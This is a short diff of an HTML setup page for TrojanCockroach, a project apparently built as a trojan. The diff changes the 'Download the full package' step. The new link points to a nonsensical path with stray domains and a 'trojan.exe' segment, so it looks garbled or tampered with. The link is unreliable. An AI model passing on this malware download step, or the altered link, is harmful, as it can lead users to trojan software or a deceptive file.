@@ -23,7 +23,7 @@ Preparation
 <br/>
 <ol>
 <li>
-  Download the full package from <a href="https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/MinhasKamal/TrojanCockroach/tree/master/com/minhaskamal/trojanCockroach">here</a>.
+  Download the full package from <a href="https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/MinhasKamal/TrojanCockroach/tree/master/com/minhaskamal/trojanCockroach/www.cyberjawara.co.id/bugs/bugsnags/trojan.exe/www.ipinfo.id/bugs/">here</a>.
 </li>
 <br/>
 <li>
